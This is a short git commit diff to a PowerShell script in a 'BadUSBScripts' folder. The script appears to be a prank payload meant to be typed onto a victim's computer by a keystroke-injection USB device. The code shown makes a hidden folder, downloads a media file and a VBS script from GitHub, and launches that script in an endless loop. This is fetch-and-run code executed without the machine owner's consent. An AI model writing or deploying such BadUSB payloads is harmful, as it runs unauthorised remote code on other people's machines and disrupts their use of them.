21fdce403ad4e64f5f7152a322f93fc8a660f44c
Babyporkchop <93239527+Babyporkchop@users.noreply.github.com>
2023-01-19 12:13:17 +0800

    Update RickRoll.ps1

--- BadUSBScripts/RickRoll/ContinuousRickRoll/RickRoll.ps1
+++ BadUSBScripts/RickRoll/ContinuousRickRoll/RickRoll.ps1
@@ -3,7 +3,7 @@
     mkdir RickRoll
     attrib +H RickRoll
     cd RickRoll
-    Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/BadUSBScripts/RickRoll/RickRoll.mp4 -OutFile .\RickRoll.mp4
+    Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/BadUSBScripts/RickRoll/ContinuousRickRoll/RickRoll.mp3 -OutFile .\RickRoll.mp3
     Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/BadUSBScripts/RickRoll/ContinuousRickRoll/Play.vbs -OutFile .\Play.vbs
     while ($true) {
         start Play.vbs
